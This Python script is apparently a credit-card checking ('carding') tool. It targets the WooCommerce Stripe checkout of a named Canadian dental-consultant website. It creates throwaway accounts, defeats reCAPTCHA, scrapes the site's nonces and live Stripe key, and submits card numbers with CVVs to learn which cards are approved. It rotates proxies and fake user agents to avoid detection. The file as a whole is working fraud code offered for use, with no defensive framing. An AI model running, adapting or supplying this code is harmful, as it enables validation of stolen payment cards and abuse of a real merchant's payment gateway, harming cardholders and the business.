# ============================================================
#  SA2 — Stripe Auth CVV (nbconsultantedentaire.ca WC Stripe)
#  1:1 port from meduza_patched flow2
# ============================================================

import requests
import random
import string
import secrets
import uuid
import time
import re
from datetime import datetime
from typing import Optional, Dict
from urllib.parse import parse_qsl, urlencode

try:
    from faker import Faker
except ImportError:
    Faker = None

try:
    from fake_useragent import UserAgent
except ImportError:
    UserAgent = None


def _gstr(src, a, b):
    try:
        return src.split(a, 1)[1].split(b, 1)[0]
    except Exception:
        return ""


_EMAILS = [
    'gmail.com','yahoo.com','outlook.com','hotmail.com','icloud.com',
    'proton.me','protonmail.com','live.com','msn.com','yahoo.co.id',
    'yahoo.co.uk','yahoo.co.jp','ymail.com','rocketmail.com','live.uk',
    'live.co.uk','live.ca','outlook.co.uk','outlook.jp','tutanota.com',
    'tutanota.de','mailbox.org','zoho.com','zohomail.com','fastmail.com',
    'pm.me','yandex.com','yandex.ru','mail.ru','gmx.com','gmx.de',
    'web.de','seznam.cz','laposte.net','orange.fr','byom.de','byom.my.id',
]


class _RecaptchaSolver:
    BASE = "https://www.google.com/recaptcha"
    HEADERS = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
    }
    RE_API = re.compile(r"(api2|enterprise)/anchor\?(.*)")
    RE_C = re.compile(r'value="([^"]+)"')
    RE_TOKEN = re.compile(r'"rresp","([^"]+)"')

    def __init__(self, proxies=None, timeout=10, retry=3):
        self.proxies = proxies or []
        self.timeout = timeout
        self.retry = retry
        self.session = requests.Session()
        self.session.headers.update(self.HEADERS)
        self._last_params = None
        self._last_c = None

    def solve(self, anchor_url):
        m = self.RE_API.search(anchor_url)
        if not m:
            raise ValueError("Invalid recaptcha anchor url")
        api = m.group(1)
        params = dict(parse_qsl(m.group(2)))
        proxy = self._proxy()
        anchor_html = self._request("GET", f"{self.BASE}/{api}/anchor", params=params, proxy=proxy)
        c_m = self.RE_C.search(anchor_html)
        if not c_m:
            raise RuntimeError("Failed to extract c value")
        c_value = c_m.group(1)
        self._last_params = params
        self._last_c = c_value
        payload = urlencode({"v": params["v"], "reason": "q", "c": c_value, "k": params["k"], "co": params["co"]})
        reload_html = self._request("POST", f"{self.BASE}/{api}/reload", params={"k": params["k"]}, data=payload, proxy=proxy)
        t_m = self.RE_TOKEN.search(reload_html)
        if not t_m:
            raise RuntimeError("Failed to extract token")
        return t_m.group(1)

    def _proxy(self):
        if not self.proxies:
            return None
        p = random.choice(self.proxies)
        if p.startswith("http"):
            return {"http": p, "https": p}
        return {"http": f"http://{p}", "https": f"http://{p}"}

    def _request(self, method, url, *, params=None, data=None, proxy=None):
        for i in range(self.retry):
            try:
                r = self.session.request(method, url, params=params, data=data, proxies=proxy, timeout=self.timeout)
                r.raise_for_status()
                return r.text
            except Exception as e:
                if i == self.retry - 1:
                    raise
                time.sleep(0.8 + random.random() * 1.2)


def _process(cc, mm, yy, cvv, proxy_dict=None):
    ses = requests.Session()
    if proxy_dict:
        ses.proxies.update(proxy_dict)

    if UserAgent:
        ua = UserAgent(platforms='mobile')
        useragents = ua.random
    else:
        useragents = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36'

    fake = Faker("en_UK") if Faker else None
    password = "".join(secrets.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(12))
    email = f"{fake.user_name().lower() if fake else ''.join(random.choices(string.ascii_lowercase, k=8))}_{secrets.token_hex(4)}@{random.choice(_EMAILS)}"
    guid, muid, sid, sessionuid = (str(uuid.uuid4()) for _ in range(4))
    today1 = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    mm = mm.zfill(2)
    yy = yy[-2:].zfill(2)
    cvv = cvv[:4]

    h_base = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'user-agent': useragents,
    }

    # 1. Get register nonce
    r = ses.get('https://www.nbconsultantedentaire.ca/en/my-account/', headers={**h_base, 'referer': 'https://www.nbconsultantedentaire.ca/en/my-account/'}, timeout=35, verify=False)
    txt = r.text.strip()
    regN = _gstr(txt, 'hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '"')
    if not regN:
        regN = _gstr(txt, 'name="woocommerce-register-nonce" value="', '"')
    if not regN:
        return None, "Failed to get register nonce"

    # 2. Register (with password)
    reg_h = {**h_base, 'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://www.nbconsultantedentaire.ca',
             'referer': 'https://www.nbconsultantedentaire.ca/en/my-account/'}
    reg_data = {
        'email': email, 'password': password,
        'wc_order_attribution_source_type': 'organic',
        'wc_order_attribution_referrer': 'https://www.google.com/',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': 'google',
        'wc_order_attribution_utm_medium': 'organic',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://www.nbconsultantedentaire.ca/en/my-account/',
        'wc_order_attribution_session_start_time': today1,
        'wc_order_attribution_session_pages': '1',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': useragents,
        'woocommerce-register-nonce': regN,
        '_wp_http_referer': '/en/my-account/',
        'register': 'Register',
    }
    ses.post('https://www.nbconsultantedentaire.ca/en/my-account/', headers=reg_h, data=reg_data, timeout=35, verify=False)

    # 3. Navigate through payment method pages (exact order from original)
    ses.get('https://www.nbconsultantedentaire.ca/en/mon-compte-2/payment-methods/', headers={**h_base, 'referer': 'https://www.nbconsultantedentaire.ca/en/my-account/'}, timeout=35, verify=False)
    ses.get('https://www.nbconsultantedentaire.ca/mon-compte-2/', headers={**h_base, 'referer': 'https://www.nbconsultantedentaire.ca/en/my-account/'}, timeout=35, verify=False)
    ses.get('https://www.nbconsultantedentaire.ca/mon-compte-2/moyens-de-paiement/', headers={**h_base, 'referer': 'https://www.nbconsultantedentaire.ca/mon-compte-2/'}, timeout=35, verify=False)
    r = ses.get('https://www.nbconsultantedentaire.ca/mon-compte-2/ajouter-mode-paiement/', headers={**h_base, 'referer': 'https://www.nbconsultantedentaire.ca/mon-compte-2/moyens-de-paiement/'}, timeout=35, verify=False)
    txt = r.text
    setupnonce = _gstr(txt, 'createAndConfirmSetupIntentNonce":"', '"')
    pklive = _gstr(txt, '"key":"', '"')

    if not setupnonce or not pklive:
        return None, "Failed to get setup nonce or PK"

    # 4. Stripe elements session
    stripe_h = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'user-agent': useragents,
    }
    ses.get(
        f'https://api.stripe.com/v1/elements/sessions?deferred_intent[mode]=setup&deferred_intent[currency]=cad&deferred_intent[payment_method_types][0]=card&deferred_intent[payment_method_types][1]=link&deferred_intent[setup_future_usage]=off_session&currency=cad&key={pklive}&_stripe_version=2024-06-20&elements_init_source=stripe.elements&referrer_host=www.nbconsultantedentaire.ca&stripe_js_id={sessionuid}&locale=fr-CA&type=deferred_intent',
        headers=stripe_h, timeout=35, verify=False)

    # 5. Create payment method
    pm_h = {
        'accept': 'application/json',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': useragents,
    }
    pm_data = {
        "type": "card",
        "card[number]": cc, "card[cvc]": cvv,
        "card[exp_year]": yy, "card[exp_month]": mm,
        "allow_redisplay": "unspecified",
        "billing_details[address][country]": "ID",
        "pasted_fields": "number,cvc",
        "payment_user_agent": "stripe.js/5e3ab853dc; stripe-js-v3/5e3ab853dc; payment-element; deferred-intent",
        "referrer": "https://www.nbconsultantedentaire.ca",
        "time_on_page": str(random.randint(15000, 50000)),
        "client_attribution_metadata[client_session_id]": "7071bdda-25bf-44e2-b3f9-24a6d871f023",
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
        "client_attribution_metadata[merchant_integration_version]": "2021",
        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
        "client_attribution_metadata[elements_session_config_id]": "b290e603-1607-48c0-bca8-e701f839f27a",
        "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
        "guid": guid, "muid": muid, "sid": sid,
        "_stripe_version": "2024-06-20",
        "key": pklive,
    }
    xr = ses.post('https://api.stripe.com/v1/payment_methods', headers=pm_h, data=pm_data, timeout=35, verify=False)
    txt = xr.text.strip()
    idpm = _gstr(txt, 'id": "', '"')
    if not idpm:
        msg = _gstr(txt, 'message": "', '"') or "Payment method creation failed"
        return False, msg

    # 6. Create and confirm setup intent (wc_stripe action)
    ajax_h = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.nbconsultantedentaire.ca',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://www.nbconsultantedentaire.ca/mon-compte-2/ajouter-mode-paiement/',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': useragents,
        'x-requested-with': 'XMLHttpRequest',
    }
    ajax_data = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': idpm,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': setupnonce,
    }
    r3 = ses.post('https://www.nbconsultantedentaire.ca/wp-admin/admin-ajax.php',
                  headers=ajax_h, data=ajax_data, timeout=35, verify=False)
    res = r3.json()
    reszx = r3.text.strip()

    data = res.get("data") or {}
    status = data.get("status")
    error_msg = data.get("error", {}).get("message") or _gstr(reszx, 'message":"', '"')

    if status == "succeeded":
        return True, "Card Approved"
    elif status == "requires_action":
        return False, "3DS Required"
    elif error_msg:
        return False, error_msg

    return None, "Unknown response"


def check_card(cc_line, proxy_dict=None):
    start = time.time()
    try:
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "Error | Invalid format"
        cc, mm, yy, cvv = parts

        for attempt in range(5):
            try:
                result, detail = _process(cc, mm, yy, cvv, proxy_dict)
                elapsed = f"{time.time() - start:.1f}s"
                if result is True:
                    return f"Approved | {detail} | {elapsed}"
                elif result is False:
                    return f"Declined | {detail} | {elapsed}"
                else:
                    if attempt < 4:
                        time.sleep(random.uniform(2, 5))
                        continue
                    return f"Error | {detail} | {elapsed}"
            except (requests.exceptions.ProxyError, requests.exceptions.SSLError,
                    requests.exceptions.ConnectionError, requests.exceptions.Timeout,
                    ConnectionError, OSError):
                if attempt < 4:
                    time.sleep(random.uniform(0.3, 1.0))
                    continue
                return f"Declined | Gateway Timeout | {time.time() - start:.1f}s"
            except Exception as e:
                return f"Error | {str(e)[:60]} | {time.time() - start:.1f}s"
    except Exception as e:
        return f"Error | {str(e)[:60]}"


def probe_site():
    try:
        r = requests.get('https://www.nbconsultantedentaire.ca/en/my-account/', timeout=15, verify=False)
        if 'woocommerce-register-nonce' in r.text:
            return True, "WC Stripe registration active"
        return False, "Registration form not found"
    except Exception as e:
        return False, str(e)[:60]
